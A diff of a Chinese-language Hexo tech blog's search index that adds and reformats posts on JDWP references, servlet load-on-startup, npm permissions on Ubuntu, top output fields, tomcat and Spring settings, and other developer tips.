+<li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html" rel="external nofollow noopener noreferrer" target="_blank">Java Platform Debugger Architecture</a></li>
+<li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jpda/jdwp-spec.html" rel="external nofollow noopener noreferrer" target="_blank">Java(tm) Debug Wire Protocol</a></li>
+<li><a href="http://files.meetup.com/3189882/Java%20Debugger%20Internals.pdf" rel="external nofollow noopener noreferrer" target="_blank">Java Debugger Internals - Meetup</a></li>
+<li><a href="https://_thorns.gitbooks.io/sec/content/java_debug_remote_code_execution.html" rel="external nofollow noopener noreferrer" target="_blank">Java Debug Remote Code Execution · 安全手册</a></li>
+<li><a href="https://secwiki.org/w/FAQ_missing_port" rel="external nofollow noopener noreferrer" target="_blank">FAQ missing port - SecWiki</a></li>
+<li><a href="https://github.com/IOActive/jdwp-shellifier" rel="external nofollow noopener noreferrer" target="_blank">IOActive/jdwp-shellifier</a></li>
+<li><a href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/" rel="external nofollow noopener noreferrer" target="_blank">Hacking the Java Debug Wire Protocol - or - “How I met your Java debugger” | IOActive</a></li>
+<li><a href="https://nmap.org/nsedoc/scripts/jdwp-exec.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-exec NSE Script</a></li>
+<li><a href="https://nmap.org/nsedoc/scripts/jdwp-info.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-info NSE Script</a></li>
+<li><a href="https://nmap.org/nsedoc/scripts/jdwp-inject.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-inject NSE Script</a></li>
+</ul>
+]]></content>
+      
+        <categories>
+            
+            <category> jvm </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> jdwp </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[web.xml]]></title>
+      <url>http://qsli.github.io/2018/08/11/web-xml/</url>
+      <content type="html"><![CDATA[<h2 id="load-on-startup标签"><a href="#load-on-startup标签" class="headerlink" title="load-on-startup标签"></a>load-on-startup标签</h2><blockquote>
+<p>Servlets are initialized either lazily at request processing time or eagerly during<br>deployment. In the latter case, they are initialized in the order indicated by<br>their load-on-startup elements.</p>
+</blockquote>
+<p>在web容器启动的时候，可以采用<code>lazily</code>加载的方式和<code>eagerly</code>的方式。</p>
+<p><code>load-on-startup</code>中的值决定了进行哪种方式。</p>
+<blockquote>
+<p>If the value is a negative integer, or the element is not present, the<br>container is free to load the servlet whenever it chooses. If the value is a positive<br>integer or 0, the container must load and initialize the servlet as the application is<br>deployed.</p>
+</blockquote>
+<p>如果<load-on-startup>这个元素没有出现，或者出现了但是里面的值是负的，容器可以按照自己的需要选择加载Servlet的时机。</load-on-startup></p>
+<p>如果里面的值是正数或者0，容器必须保证在容器启动的时候加载和初始化这个servlet</p>
+<blockquote>
+<p> The container must guarantee that servlets marked with lower integers<br>are loaded before servlets marked with higher integers.</p>
+</blockquote>
+<p>这个值越小，优先级越高，容器优先加载。</p>
+<blockquote>
+<p>The container may choose<br>the order of loading of servlets with the same load-on-startup value.</p>
+</blockquote>
+<p>如果里面的值是一样的，那么加载的顺序由容器来决定（不同实现可能不同）</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
+<li>Java Servlet Specification 3.0</li>
+</ol>
+]]></content>
+      
+        <categories>
+            
+            <category> tomcat </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> servlet </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[hexo迁移到ubuntu]]></title>
+      <url>http://qsli.github.io/2018/08/11/hexo-ubuntu/</url>
+      <content type="html"><![CDATA[<p>系统切换到ubuntu之后，使用的apt安装的node，默认权限是sudo。安装hexo之后也必须以sudo身份执行。<br>需要修改下node的权限，命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  qsli.github.com (hexo|✚1…)  npm config get prefix</span><br><span class="line">/usr/local</span><br></pre></td></tr></table></figure>
+<p>修改owner</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R $(whoami) $(npm config get prefix)/&#123;lib/node_modules,bin,share&#125;</span><br></pre></td></tr></table></figure>
+<p>修改owner之后就可以正常执行hexo了。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a href="https://docs.npmjs.com/getting-started/fixing-npm-permissions" rel="external nofollow noopener noreferrer" target="_blank">03 - Fixing npm permissions | npm Documentation</a></li>
+</ol>
+]]></content>
+      
+        <categories>
+            
+            <category> hexo </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> hexo </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[linux终端对齐问题]]></title>
       <url>http://qsli.github.io/2018/07/11/column-view/</url>
       <content type="html"><![CDATA[<h2 id="输出乱了"><a href="#输出乱了" class="headerlink" title="输出乱了?"></a>输出乱了?</h2><p>比如<code>vmstat</code>命令, 输出歪歪扭扭的, 强迫症简直不能忍啊, 而且看个指标还得先对齐下.</p>
@@ -424,6 +615,8 @@ b. returnValueHandlers#handleReturnValue
 <p>首先脚本使用<code>getopts</code>来获取命令行的参数， 指定解析<code>-P</code>、<code>-U</code>、<code>-J</code>、<code>-C</code>这几个参数，设置一些flag。<br>注意下case语句中的<code>？</code>， 代表无法识别的命令行参数, 这时就打印出help，然后退出程序：</p>
 <blockquote>
 <p>The GNU getopt command uses the GNU getopt() library function to do the parsing of the arguments and options.</p>
+</blockquote>
+<blockquote>
 <p>If getopt() does not recognize an option character, it prints an error message to stderr, stores the character in optopt, and returns ?. The calling program may prevent the error message by setting opterr to 0.</p>
 </blockquote>
 <p>然后greys.sh这个脚本会检查greys的版本是否有更新， 除了检查更新就是<code>attach jvm</code>和<code>active console</code>：</p>
@@ -497,75 +690,6 @@ b. returnValueHandlers#handleReturnValue
         <tags>
             
             <tag> greys </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[hexo迁移到ubuntu]]></title>
-      <url>http://qsli.github.io/2018/03/15/hexo-ubuntu/</url>
-      <content type="html"><![CDATA[<p>系统切换到ubuntu之后，使用的apt安装的node，默认权限是sudo。安装hexo之后也必须以sudo身份执行。<br>需要修改下node的权限，命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  qsli.github.com (hexo|✚1…)  npm config get prefix</span><br><span class="line">/usr/local</span><br></pre></td></tr></table></figure>
-<p>修改owner</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R $(whoami) $(npm config get prefix)/&#123;lib/node_modules,bin,share&#125;</span><br></pre></td></tr></table></figure>
-<p>修改owner之后就可以正常执行hexo了。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
-<li><a href="https://docs.npmjs.com/getting-started/fixing-npm-permissions" rel="external nofollow noopener noreferrer" target="_blank">03 - Fixing npm permissions | npm Documentation</a></li>
-</ol>
-]]></content>
-      
-        <categories>
-            
-            <category> hexo </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> hexo </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[web.xml]]></title>
-      <url>http://qsli.github.io/2018/03/15/web-xml/</url>
-      <content type="html"><![CDATA[<h2 id="load-on-startup标签"><a href="#load-on-startup标签" class="headerlink" title="load-on-startup标签"></a>load-on-startup标签</h2><blockquote>
-<p>Servlets are initialized either lazily at request processing time or eagerly during<br>deployment. In the latter case, they are initialized in the order indicated by<br>their load-on-startup elements.</p>
-</blockquote>
-<p>在web容器启动的时候，可以采用<code>lazily</code>加载的方式和<code>eagerly</code>的方式。</p>
-<p><code>load-on-startup</code>中的值决定了进行哪种方式。</p>
-<blockquote>
-<p>If the value is a negative integer, or the element is not present, the<br>container is free to load the servlet whenever it chooses. If the value is a positive<br>integer or 0, the container must load and initialize the servlet as the application is<br>deployed.</p>
-</blockquote>
-<p>如果<load-on-startup>这个元素没有出现，或者出现了但是里面的值是负的，容器可以按照自己的需要选择加载Servlet的时机。</load-on-startup></p>
-<p>如果里面的值是正数或者0，容器必须保证在容器启动的时候加载和初始化这个servlet</p>
-<blockquote>
-<p> The container must guarantee that servlets marked with lower integers<br>are loaded before servlets marked with higher integers.</p>
-</blockquote>
-<p>这个值越小，优先级越高，容器优先加载。</p>
-<blockquote>
-<p>The container may choose<br>the order of loading of servlets with the same load-on-startup value.</p>
-</blockquote>
-<p>如果里面的值是一样的，那么加载的顺序由容器来决定（不同实现可能不同）</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
-<li>Java Servlet Specification 3.0</li>
-</ol>
-]]></content>
-      
-        <categories>
-            
-            <category> tomcat </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> servlet </tag>
             
         </tags>
         
@@ -678,6 +802,8 @@ b. returnValueHandlers#handleReturnValue
 <p>并没有看到具体的系统调用，查找原因发现：</p>
 <blockquote>
 <p>这里使用 ltrace 是因为 linux 支持 VDSO 之后，gettimeofday 属于快速系统调用，使<br>用 strace 是看不到执行结果的。</p>
+</blockquote>
+<blockquote>
 <p>What is actually happening here is that we are linking to the vDSO (virtual<br>dynamic shared object), which is a small fully relocatable shared library<br>pre-mapped into the user address space. The linking happens during the first<br>call of gettimeofday, after which the call is resolved, and the first indirect<br>jump goes straight into the function.</p>
 </blockquote>
 <p>重新使用<code>ltrace</code>查看：</p>
@@ -780,7 +906,7 @@ b. returnValueHandlers#handleReturnValue
 <p>将内存块的内容dump成文件（慎重，会影响服务）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  gdb --batch --pid 25147 -ex &quot; dump memory /home/qisheng.li/c.dump 0x00007eefcc000000 0x00007eefcf000000&quot;</span><br></pre></td></tr></table></figure></p>
 <p>查看文件的内容：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@xxx.h.cn2 ~]$ view c.dump</span><br></pre></td></tr></table></figure>
-<img src="/2017/12/02/google-perf-tools/2017年%2009月%2005日%20星期二%2001:34:24%20CST.png">
+
 <p>这个dump是我在<code>2017年 09月 05日 星期二 01:34:24 CST</code>做的，但是内容看起来是tomcat respone的内容，奇怪的是内容的时间是<code>2017 17:38:18 GMT</code>，不知道是什么原因导致的，如果你知道，烦请告知。</p>
 <p>直接查看堆外的内存块，无疑是最快排查堆外占用的方法，但是内存块的选择非常依赖经验， 我尝试了下，并没有找到问题。</p>
 <p><code>参考5</code>中的大神，通过dump内存块，发现是netty使用的<code>directBuffer</code>分配的大量64M的内存块。</p>
@@ -1363,6 +1489,8 @@ FD is followed by one of these characters, describing the mode under which the f
 <p>如果被占用，直接使用<code>rm</code>删除相当于只是删除了文件名和inode的关联, 但是文件占用的空间还在(block), 应该使用下面的命令进行删除：</p>
 <blockquote>
 <p>You misunderstand: deletion will be complete only after all processes using the file at the time of deletion have reached completion: only then the deleted inode will be returned to the pool of available inodes, and the content of the file may begin to be corrupted by over-writing. Until then, the inode is alive and well, and is pointing to the area of the disk containing the file in question. As soon as less completes, the soft link will disappear, and so will the file testing.txt.</p>
+</blockquote>
+<blockquote>
 <pre><code>当我们使用rm命令的时候，系统并不会真正删除这个资料。除非有档案非要将资料存储在原来档案的这些block中。这样原来的block就会被新档案给覆盖掉。 
 </code></pre></blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /dev/null &gt; filename</span><br><span class="line">或者</span><br><span class="line">truncate -s 0 filename</span><br></pre></td></tr></table></figure>
@@ -1413,35 +1541,63 @@ FD is followed by one of these characters, describing the mode under which the f
 <p> 第二行包含了系统进程的一些统计信息，Tasks是运行队列中的任务个数（Linux run-queue）， 还有一些其他状态的进程的个数信息</p>
 <blockquote>
 <ul>
-<li><p><strong>running</strong>:  CPU 上运行的和将要被调度运行的；</p>
-</li>
-<li><p><strong>sleeping</strong>: 通常是等待事件(比如 IO 操作)完成的任务，细分可以包括 interruptible 和 uninterruptible 的类型；</p>
-</li>
-<li><p><strong>stopped</strong>: 是一些被暂停的任务，通常发送 SIGSTOP 或者对一个前台任务操作 Ctrl-Z 可以将其暂停；</p>
-</li>
-<li><p><strong>zombie</strong>: 僵尸任务，虽然进程终止资源会被自动回收，但是含有退出任务的 task descriptor 需要父进程访问后才能释放，这种进程显示为 <code>defunct</code> 状态，无论是因为父进程提前退出还是未 wait 调用，出现这种进程都应该格外注意程序是否设计有误。</p>
-</li>
+<li><strong>running</strong>:  CPU 上运行的和将要被调度运行的；</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li><strong>sleeping</strong>: 通常是等待事件(比如 IO 操作)完成的任务，细分可以包括 interruptible 和 uninterruptible 的类型；</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li><strong>stopped</strong>: 是一些被暂停的任务，通常发送 SIGSTOP 或者对一个前台任务操作 Ctrl-Z 可以将其暂停；</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li><strong>zombie</strong>: 僵尸任务，虽然进程终止资源会被自动回收，但是含有退出任务的 task descriptor 需要父进程访问后才能释放，这种进程显示为 <code>defunct</code> 状态，无论是因为父进程提前退出还是未 wait 调用，出现这种进程都应该格外注意程序是否设计有误。</li>
 </ul>
 </blockquote>
 <h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><p> 第三行是CPU的一些信息，各个部分的占用都很明确。</p>
 <blockquote>
 <ul>
-<li><p>(us) user：CPU 在低 nice 值(高优先级)用户态所占用的时间(nice&lt;=0)。正常情况下只要服务器不是很闲，那么大部分的 CPU 时间应该都在此执行这类程序</p>
-</li>
-<li><p>(sy) system：CPU 处于内核态所占用的时间，操作系统通过系统调用(system call)从用户态陷入内核态，以执行特定的服务；通常情况下该值会比较小，但是当服务器执行的 IO 比较密集的时候，该值会比较大</p>
-</li>
-<li><p>(ni) nice：CPU 在高 nice 值(低优先级)用户态以低优先级运行占用的时间(nice&gt;0)。默认新启动的进程 nice=0，是不会计入这里的，除非手动通过 renice 或者 setpriority() 的方式修改程序的nice值</p>
-</li>
-<li><p>(id) idle：CPU 在空闲状态(执行 kernel idle handler )所占用的时间</p>
-</li>
-<li><p>(wa) iowait：等待 IO 完成做占用的时间</p>
-</li>
-<li><p>(hi) irq：系统处理硬件中断所消耗的时间</p>
-</li>
-<li><p>(si) softirq：系统处理软中断所消耗的时间，记住软中断分为 softirqs、tasklets (其实是前者的特例)、work queues，不知道这里是统计的是哪些的时间，毕竟 work queues 的执行已经不是中断上下文了</p>
-</li>
-<li><p>(st) steal：在虚拟机情况下才有意义，因为虚拟机下 CPU 也是共享物理 CPU 的，所以这段时间表明虚拟机等待 hypervisor 调度 CPU 的时间，也意味着这段时间 hypervisor 将 CPU 调度给别的 CPU 执行，这个时段的 CPU 资源被“stolen”了。这个值在我 KVM 的 VPS 机器上是不为 0 的，但也只有 0.1 这个数量级，是不是可以用来判断 VPS 超售的情况？</p>
-</li>
+<li>(us) user：CPU 在低 nice 值(高优先级)用户态所占用的时间(nice&lt;=0)。正常情况下只要服务器不是很闲，那么大部分的 CPU 时间应该都在此执行这类程序</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>(sy) system：CPU 处于内核态所占用的时间，操作系统通过系统调用(system call)从用户态陷入内核态，以执行特定的服务；通常情况下该值会比较小，但是当服务器执行的 IO 比较密集的时候，该值会比较大</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>(ni) nice：CPU 在高 nice 值(低优先级)用户态以低优先级运行占用的时间(nice&gt;0)。默认新启动的进程 nice=0，是不会计入这里的，除非手动通过 renice 或者 setpriority() 的方式修改程序的nice值</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>(id) idle：CPU 在空闲状态(执行 kernel idle handler )所占用的时间</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>(wa) iowait：等待 IO 完成做占用的时间</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>(hi) irq：系统处理硬件中断所消耗的时间</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>(si) softirq：系统处理软中断所消耗的时间，记住软中断分为 softirqs、tasklets (其实是前者的特例)、work queues，不知道这里是统计的是哪些的时间，毕竟 work queues 的执行已经不是中断上下文了</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>(st) steal：在虚拟机情况下才有意义，因为虚拟机下 CPU 也是共享物理 CPU 的，所以这段时间表明虚拟机等待 hypervisor 调度 CPU 的时间，也意味着这段时间 hypervisor 将 CPU 调度给别的 CPU 执行，这个时段的 CPU 资源被“stolen”了。这个值在我 KVM 的 VPS 机器上是不为 0 的，但也只有 0.1 这个数量级，是不是可以用来判断 VPS 超售的情况？</li>
 </ul>
 </blockquote>
 <p>iowait所包含的信息其实是非常少的，具体的解释可以看<strong>参考3</strong>中的文章，讲的非常好.</p>
@@ -1649,6 +1805,8 @@ FD is followed by one of these characters, describing the mode under which the f
 <h2 id="maxThreads"><a href="#maxThreads" class="headerlink" title="maxThreads"></a>maxThreads</h2><p>tomcat的连接线程最大个数。</p>
 <blockquote>
 <p>The maximum number of request processing threads to be created by this Connector, which therefore determines the maximum number of simultaneous requests that can be handled. If not specified, this attribute is set to 200. If an executor is associated with this connector, this attribute is ignored as the connector will execute tasks using the executor rather than an internal thread pool. Note that if an executor is configured any value set for this attribute will be recorded correctly but it will be reported (e.g. via JMX) as -1 to make clear that it is not used.</p>
+</blockquote>
+<blockquote>
 <p>maxThreads、minSpareThreads是tomcat工作线程池的配置参数，maxThreads就相当于jdk线程池的maxPoolSize，而minSpareThreads就相当于jdk线程池的corePoolSize。</p>
 </blockquote>
 <p>相应的代码如下：</p>
@@ -1804,16 +1962,27 @@ FD is followed by one of these characters, describing the mode under which the f
 </blockquote>
 <h3 id="scratches优势"><a href="#scratches优势" class="headerlink" title="scratches优势"></a>scratches优势</h3><blockquote>
 <ol>
-<li><p>The scratch code in scripting languages is <em>executable</em>.</p>
-</li>
-<li><p>you can run and <em>debug</em> it.</p>
-</li>
-<li><p><em>Local history</em> for scratches is supported.</p>
-</li>
-<li><p>It is possible to perform <em>clipboard operations</em> with scratches.</p>
-</li>
-<li><p>The scratches are <em>stored</em>, depending on your operating system,<br>Under IntelliJ IDEA home, in the directory config/scratches (on Windows/*NIX)<br>~ Library-&gt;Preferences-&gt;<intellij idea="">XX-&gt;scratches(on OS X)<br>You can undo or redo changes in scratches.</intellij></p>
-</li>
+<li>The scratch code in scripting languages is <em>executable</em>.</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="2">
+<li>you can run and <em>debug</em> it.</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="3">
+<li><em>Local history</em> for scratches is supported.</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="4">
+<li>It is possible to perform <em>clipboard operations</em> with scratches.</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="5">
+<li>The scratches are <em>stored</em>, depending on your operating system,<br>Under IntelliJ IDEA home, in the directory config/scratches (on Windows/*NIX)<br>~ Library-&gt;Preferences-&gt;<intellij idea="">XX-&gt;scratches(on OS X)<br>You can undo or redo changes in scratches.</intellij></li>
 </ol>
 </blockquote>
 <h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>以下功能基于Intellij Idea 2016.3.4</p>
@@ -1856,6 +2025,8 @@ FD is followed by one of these characters, describing the mode under which the f
 <h3 id="FactoryBean"><a href="#FactoryBean" class="headerlink" title="FactoryBean"></a>FactoryBean</h3><p>是Spring提供的一个接口，用来定制Bean的初始化逻辑。</p>
 <blockquote>
 <p>If you have complex initialization code that is better expressed in Java as opposed to a (potentially) verbose amount of XML, you can create your own FactoryBean</p>
+</blockquote>
+<blockquote>
 <p>  Interface to be implemented by objects used within a {@link BeanFactory} which<br>    are themselves factories for individual objects. If a bean implements this<br>    interface, it is used as a factory for an object to expose, not directly as a<br>    bean instance that will be exposed itself.</p>
 </blockquote>
 <p>这个接口有三个方法：</p>
@@ -2003,6 +2174,8 @@ FD is followed by one of these characters, describing the mode under which the f
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -q -c myarchive.jar META-INF/MANIFEST.MF</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p><code>-q</code> will suppress verbose output from the unzip program</p>
+</blockquote>
+<blockquote>
 <p><code>-c</code> will extract to stdout</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unzip -q -c servlet-api.jar META-INF/MANIFEST.MF</span><br><span class="line">Manifest-Version: 1.0</span><br><span class="line">Ant-Version: Apache Ant 1.8.1</span><br><span class="line">Created-By: 1.6.0_45-b06 (Sun Microsystems Inc.)</span><br><span class="line">X-Compile-Source-JDK: 1.6</span><br><span class="line">X-Compile-Target-JDK: 1.6</span><br><span class="line"></span><br><span class="line">Name: javax/servlet/</span><br><span class="line">Specification-Title: Java API for Servlets</span><br><span class="line">Specification-Version: 3.0</span><br><span class="line">Specification-Vendor: Sun Microsystems, Inc.</span><br><span class="line">Implementation-Title: javax.servlet</span><br><span class="line">Implementation-Version: 3.0.FR</span><br><span class="line">Implementation-Vendor: Apache Software Foundation</span><br></pre></td></tr></table></figure>
@@ -2315,9 +2488,17 @@ FD is followed by one of these characters, describing the mode under which the f
       <url>http://qsli.github.io/2017/01/07/CLIP/</url>
       <content type="html"><![CDATA[<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><blockquote>
 <p>CLIP</p>
+</blockquote>
+<blockquote>
 <p>Description:<br>    Redirects output of command line tools to the Windows clipboard.<br>    This text output can then be pasted into other programs.</p>
+</blockquote>
+<blockquote>
 <p>Parameter List:<br>    /?                  Displays this help message.</p>
+</blockquote>
+<blockquote>
 <p>Examples:<br>    DIR | CLIP          Places a copy of the current directory<br>                        listing into the Windows clipboard.</p>
+</blockquote>
+<blockquote>
 <p>   CLIP &lt; README.TXT   Places a copy of the text from readme.txt<br>                        on to the Windows clipboard.</p>
 </blockquote>
 <h2 id="简单应用"><a href="#简单应用" class="headerlink" title="简单应用"></a>简单应用</h2><h3 id="将ip地址拷贝到剪贴板"><a href="#将ip地址拷贝到剪贴板" class="headerlink" title="将ip地址拷贝到剪贴板"></a>将ip地址拷贝到剪贴板</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig | find <span class="string">"IPv4"</span> | find /V <span class="string">"自动"</span>  | find /V <span class="string">"Auto"</span> | awk <span class="string">"&#123; print <span class="variable">$(NF)</span>;&#125;"</span> | CLIP</span><br></pre></td></tr></table></figure>
@@ -2399,6 +2580,8 @@ FD is followed by one of these characters, describing the mode under which the f
 </ul>
 <h3 id="kityminder-editor"><a href="#kityminder-editor" class="headerlink" title="kityminder-editor"></a>kityminder-editor</h3><blockquote>
 <p>KityMinder Editor 是一款强大、简洁、体验优秀的脑图编辑工具，适合用于编辑树/图/网等结构的数据。</p>
+</blockquote>
+<blockquote>
 <p>编辑器由百度 FEX 基于 kityminder-core 搭建，并且在百度脑图中使用。</p>
 </blockquote>
 <h2 id="让hexo支持kityminder"><a href="#让hexo支持kityminder" class="headerlink" title="让hexo支持kityminder"></a>让hexo支持kityminder</h2><p>这个主要是客户端渲染的。</p>
@@ -2789,6 +2972,8 @@ FD is followed by one of these characters, describing the mode under which the f
 <p><code>X-Forwarded-For: client1, proxy1, proxy2</code></p>
 <blockquote>
 <p>其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边（client1）是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。 在上面这个例子中，这个请求成功通过了三台代理服务器：proxy1, proxy2 及 proxy3。请求由client1发出，到达了proxy3（proxy3可能是请求的终点）。请求刚从client1中发出时，XFF是空的，请求被发往proxy1；通过proxy1的时候，client1被添加到XFF中，之后请求被发往proxy2;通过proxy2的时候，proxy1被添加到XFF中，之后请求被发往proxy3；通过proxy3时，proxy2被添加到XFF中，之后请求的的去向不明，如果proxy3不是请求终点，请求会被继续转发。</p>
+</blockquote>
+<blockquote>
 <p>鉴于伪造这一字段非常容易，应该谨慎使用X-Forwarded-For字段。正常情况下XFF中最后一个IP地址是最后一个代理服务器的IP地址, 这通常是一个比较可靠的信息来源。</p>
 </blockquote>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
@@ -2856,6 +3041,8 @@ FD is followed by one of these characters, describing the mode under which the f
 <p>参见<a href="http://axiaoxin.com/article/77/" rel="external nofollow noopener noreferrer" target="_blank">json处理小技巧</a></p>
 <blockquote>
 <p>Python也有命令行里面格式化显示json的模块json.tool</p>
+</blockquote>
+<blockquote>
 <p>cat data.json<br>{“爱”: “我”, “中”: “华”}<br>cat data.json| python -m json.tool<br>{<br>    “\u4e2d”: “\u534e”,<br>    “\u7231”: “\u6211”<br>}<br>好像有什么不对劲？因为json.tool在实现的时候ensure_ascii为True，让我们用Python来自己实现一个更好的Unix filter。</p>
 </blockquote>
 <p><code>filter.py</code></p>
@@ -2885,11 +3072,11 @@ or (using formats recognized by popular editors)
       # -*- coding: &lt;encoding name&gt; -*-
 </code></pre><p>在文件头加上默认编码即可：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<ol>
+<ol start="2">
 <li>重新设置系统模块的编码</li>
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure>
-<ol>
+<ol start="3">
 <li>使用Unicode</li>
 </ol>
 <p><code>s = u&#39;中文&#39;</code> </p>
@@ -3451,8 +3638,14 @@ or (using formats recognized by popular editors)
 <h4 id="system-properties-mode"><a href="#system-properties-mode" class="headerlink" title="system-properties-mode"></a><code>system-properties-mode</code></h4><p>决定解析placeholder的顺序。这个属性的取值如下：</p>
 <blockquote>
 <p>   <strong>“ENVIRONMENT”</strong> indicates placeholders should be resolved against the current Environment and against any local properties;</p>
+</blockquote>
+<blockquote>
 <p>   <strong>“NEVER”</strong> indicates placeholders should be resolved only against local properties and never against system properties;</p>
+</blockquote>
+<blockquote>
 <p>   <strong>“FALLBACK”</strong> indicates placeholders should be resolved against any local properties and then against system properties;</p>
+</blockquote>
+<blockquote>
 <p>   <strong>“OVERRIDE”</strong> indicates placeholders should be resolved first against system properties and then against any local properties;</p>
 </blockquote>
 <p>这个属性的默认值是<code>ENVIRONMENT</code>,也就是先从环境变量中解析，然后才从我们定义的properties文件中解析，如果环境中的变量名和配置文件中的变量名冲突，</p>
@@ -3595,26 +3788,53 @@ or (using formats recognized by popular editors)
       <url>http://qsli.github.io/2016/10/16/plantuml/</url>
       <content type="html"><![CDATA[<h2 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h2><blockquote>
 <p>PlantUML is a component that allows to quickly write :</p>
+</blockquote>
+<blockquote>
 <ul>
-<li><p>Sequence diagram,</p>
-</li>
-<li><p>Usecase diagram,</p>
-</li>
-<li><p>Class diagram,</p>
-</li>
-<li><p>Activity diagram, (here is the new syntax),</p>
-</li>
-<li><p>Component diagram,</p>
-</li>
-<li><p>State diagram,</p>
-</li>
-<li><p>Deployment diagram,</p>
-</li>
-<li><p>Object diagram.</p>
-</li>
-<li><p>wireframe graphical interface</p>
-</li>
+<li>Sequence diagram,</li>
 </ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>Usecase diagram,</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>Class diagram,</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>Activity diagram, (here is the new syntax),</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>Component diagram,</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>State diagram,</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>Deployment diagram,</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>Object diagram.</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>wireframe graphical interface</li>
+</ul>
+</blockquote>
+<blockquote>
 <p>Diagrams are defined using a simple and intuitive  language. ( see PlantUML Language Reference Guide).</p>
 </blockquote>
